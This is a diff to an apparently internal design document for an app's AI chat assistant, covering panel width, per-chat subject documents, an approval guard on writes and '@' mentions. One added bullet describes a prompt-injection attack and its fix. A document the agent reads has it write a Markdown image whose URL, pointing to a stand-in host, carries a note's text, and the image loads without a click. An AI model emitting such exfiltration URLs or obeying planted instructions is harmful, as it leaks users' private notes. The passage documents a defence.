@@ -16,6 +16,18 @@ chat's change blocks in a Changes column.
 row, the sparkle, `space A` and the panel go, and `?chat=` opens home. See *Turning AI off* in
 [`settings.md`](settings.md).
 
+**The panel's width is pulled at its left edge and remembered.** A 24px grip on the edge — the
+sidebar's shape, a hairline drawn on the border it moves — follows the pointer while it is held and
+settles into `dag:assistant-w` when it is let go; a double-click puts it back to the default 380px.
+`src/assistant/width.ts` owns the range (320–720px, and never more than half the window). For the
+length of the gesture the width is painted as `--assistant-w` on the panel rather than set in React
+state, so the page beside it reflows through the shell's flex row without re-rendering the chat, and
+`App`'s ResizeObserver on `.dag-viewport` moves the canvas's published box with it. The grip is a
+focusable `separator`: Left widens and Right narrows (Shift takes a longer step), and `useEditor`'s
+capture handler leaves its arrows alone (`[data-dag-assistant-grip]`) so a board's selection is not
+nudged instead. The width is the person's, in `PREF_KEYS` beside the inspector's, so a reload reads
+it back; under 720px the panel is the window and the grip is not drawn.
+
 **The page with no chat is a welcome, not an empty thread.** `?chat=new`, or `?chat=1` in a vault
 with none, draws a short greeting with the composer centred under it, focused, and no title:
 the history's New chat row is the only control that says those words. The first message makes the
@@ -25,6 +37,70 @@ its title and the composer at the foot. **The history is every open vault's**, n
 vault is there, and its row names that vault. `Assistant.locate` finds a chat by its id in any open
 vault when the one this tab names does not hold it, which is what lets such a row open and keep
 working.
+
+**The panel opens on a new chat, not the vault's newest** (#321). A chat it made belongs to the
+document it was chosen on: closing the panel and opening it again on the same document keeps it,
+and moving to another document — another file, a list, Home — starts a new one. So the sparkle on a
+note cannot continue a conversation about another file by mistake, while the older chats stay one
+click away in the page's history, which is never filtered by document. **Opening the panel writes
+nothing**: the chat is made by its first message (or by a grant), so an empty one is never saved.
+What the panel holds lives in `src/assistant/panelState.ts` for this window only; a reload starts
+again on a new chat, and none of it is a preference (`test/prefs.test.ts`).
+
+**A chat started on a document works on that document** (#323). *Organise these notes*, typed in a
+note's panel, used to reorganise other notes in the vault when the person meant the one on the
+screen. Now the document open beside the panel is the new chat's **subject**: a chip above the field
+shows it (`DocChip`, its kind's mark and title, the name in its tooltip), the first message sends it
+as the turn's `subject: {name, kind}`, and the server keeps it in `chat.json` as `subject` with the
+vault, the kind, the name, the title and the `dag:` id the listing gives it — `peekId`, so naming a
+document as a subject writes nothing to it. Every turn looks it up again by that id, so a rename or
+a move since is followed; one that cannot be found is kept as it was. Three things follow from it:
+
+- **The agent is told it.** `systemPrompt` adds *This chat's subject*: the title, the name, the kind
+  and the reference to cite, that it is what "this" means and the document to work on unless the
+  person names others or asks about the vault, and that a change to anything else waits for the
+  person. The fake's `subject` command says that line back, which is how
+  `test/server/chat-live.test.ts` checks the page's chip reached the turn.
+- **The guard holds every other write for the person**, on the approval card the deletes already
+  use (*Change something other than "…"?*, with what it would change under it). The only writes made
+  without asking are the ones in `ONE_DOC` (`server/chat/live.ts`) — `/put`, `/patch`, `/task`,
+  `/project`, `/event`, `/table`, `/quiz`, which each change the one document they name — aimed at
+  the subject, read exactly as the route reads its name and compared by the file `fileOf` gives
+  both. A new document, a rename, a retitle (which relinks others), a copy, a folder, a picture (an
+  attachment), another vault: all ask. A delete of the subject still asks as a delete. An approved
+  write lands in the turn's block and undoes with it like any other. So *organise this* changes only
+  that note unless the person says yes to more — the server's rule, not the prompt's. Writing a link
+  into the subject can still give the linked document its `id:` (*References*), which is the vault's
+  own bookkeeping and is recorded in the block too. This is not the old Ask/Edit switch come back:
+  a chat with a subject reads the whole vault and changes its own subject freely; it only has to ask
+  before reaching further.
+- **Removing the chip makes the chat about the whole vault, as before.** The removal is said with
+  the next message (`subject: null`, a value rather than a dropped key because sync merges
+  `chat.json` by key), so it writes nothing by itself; before the first message it makes a chat with
+  no subject. A turn that sends no `subject` keeps the chat's. The page's chats have none unless one
+  was started in a panel; a panel chat continued on the page keeps its chip. A subject only narrows
+  what a turn writes unasked, so unlike a grant it can live in the vault's file and follow the chat
+  to another machine: anyone who can write `chat.json` can already write the documents it guards.
+  The turn fixes it when it starts (`Live.subject`), so nothing the agent does mid-turn moves it,
+  and `reachOf` drops a `subject` without a subject's shape.
+
+The chip is `src/assistant/DocChip.tsx`, which knows nothing about why it names a document — the
+subject is a `data-dag-chat-subject` attribute its caller puts on it — so the subject and every `@`
+mention a message carries draw the same chip.
+
+**A message can name a document with `@`** (#324). Typing `@` at the start of a word opens the
+vault's documents, filtered by what follows it with the reference picker's ranking — `rank` in
+`src/refs/rank.ts`, which the note editor's picker imports too, so there is one order and not two.
+Arrow keys move the row Enter picks, Escape closes the list and leaves the words where they are,
+and the pointer picks a row as well. Picking takes the `@query` out of the field and puts a
+`DocChip` in the message's documents row; Backspace at the chip's edge takes the last one as a
+single unit. An `@` inside a word — an email address — does not open the list. The turn request
+carries `mentions: [{name, kind}]`; the server resolves each in the page's vault with `peekId`, so
+naming one writes nothing to it, and `systemPrompt` adds *Documents mentioned in this message* with
+each document's `[title](dag:<id>)`. The fake's `mentions` command says that section back, which is
+how `test/server/chat-live.test.ts` checks the page's chips reached the turn. A mention is one
+message's, not the chat's, so it is not kept in `chat.json`; and it does not widen what the guard
+lets a turn change without asking — the subject's rule still holds.
 
 The composer is one field and one row under it: the scope chip, the model — the provider's mark and
 the model's short name, the harness named only inside the open picker — the effort resolved to what
@@ -50,7 +126,7 @@ always reaches its own vault* and read as doing nothing (#118).
 | `plugins/generate/cli.ts` | what a prompt card's run and a chat's turn both do around a CLI child: its lines, ending it, and deleting an OpenCode or Codex session |
 | `server/mcp/chat.ts` | chat mode for `anydag-server mcp --chat <id>`: the tool list, `change_block`, `vault_request` |
 | `server/routes/chat.ts` | the routes, the guard's registration, the SSE stream |
-| `src/assistant/` | the panel, the page, the composer, the steps, the approval, access and block cards — its model and effort controls are `src/ui/ModelPicker` and `src/ui/EffortPicker`, shared with Settings |
+| `src/assistant/` | the panel, the page, the composer, the steps, the approval, access and block cards, the document chip — its model and effort controls are `src/ui/ModelPicker` and `src/ui/EffortPicker`, shared with Settings |
 
 Eleven things are load-bearing:
 
@@ -65,6 +141,12 @@ Eleven things are load-bearing:
   catalog edited so the model is offered no tool of its own (see *Codex* below). That server reaches
   this one over loopback with the launch token and `x-anydag-chat: <id>` on every call, so every
   write goes through the route the page uses — the base sha1, the 409 and `merge3` included.
+- **Nor is the page one of its tools: an image from elsewhere in a reply is a link** (#10). The
+  reply is drawn as Markdown while it streams, and an `<img>` loads with no click, so
+  `![](https://elsewhere/?d=…)` with a note's text in the URL — written because a document the
+  agent read said to — was a request made for it, the one way out of a chat with no network of its
+  own. `Thread.tsx` draws any image `remoteImage` (`src/assistant/words.ts`) resolves to another
+  origin as a link with its alt text; references and the app's own files draw as before.
 - **The MCP child is this process as Node, and in the desktop app that means keeping
   `ELECTRON_RUN_AS_NODE`.** `Live.mcpFor` starts it as `process.execPath` + `process.argv[1]` +
   `mcp --chat`, with the port, token and home in its environment, and the switch too when the parent
@@ -89,7 +171,8 @@ Eleven things are load-bearing:
   vault granted to read, 403 `read-only` (the model is told to ask with `vault_request`, mode `edit`,
   which shows the access card that upgrades the grant). A delete, a folder move or trash, a
   transfer, an image sweep and a trash delete wait for the person on an approval card, and are
-  403 `declined` on No or after five minutes.
+  403 `declined` on No or after five minutes — and so, in a chat with a subject, does every write
+  that does not change the subject alone (above).
 - **The approval card is ours, not the harness's**: OpenCode reports a tool call only once it has
   finished, so a call blocked on the person is invisible in its stream. Each harness's own tool
   timeout is set above the approval's expiry.
@@ -161,9 +244,14 @@ Codex's own default. A Codex whose catalog cannot be read is unavailable rather 
 Nothing here draws under `?snapshot=1`, and the canvas never learns a chat exists: a turn's writes
 reach an open board through the change feed like any other writer's. Deleting a chat emits a `gone`
 event on the chat stream, so every open history drops the row at once and a page on that chat goes to
-New chat; the panel's open state is not remembered across a reload, and Settings → AI holds the default engine and model.
+New chat; the panel's open state and the chat it holds are not remembered across a reload (its width
+is, above), and
+Settings → AI holds the default engine and model.
 
-Names claimed, grepped first: `dag-assistant*`, `dag-chat*`, `data-dag-assistant*`, `data-dag-chat*`,
+Names claimed, grepped first: `dag-assistant*`, `dag-chat*`, `data-dag-assistant*`, `data-dag-chat*`
+— among them `dag-chat-docchip*`, `dag-chat-composer__docs`, `data-dag-chat-docchip*`,
+`data-dag-chat-subject`, `dag-chat-mentions`, `dag-chat-mention*`, `data-dag-chat-mentions` and
+`data-dag-chat-mention-*` for the subject and the `@` mentions —
 the setting `assistant`, the leader binding `space A`, and the query key `chat`.
 `src/assistant/panelState.ts` is not `panel.ts`, which `check:case` refuses beside `Panel.tsx`.
 
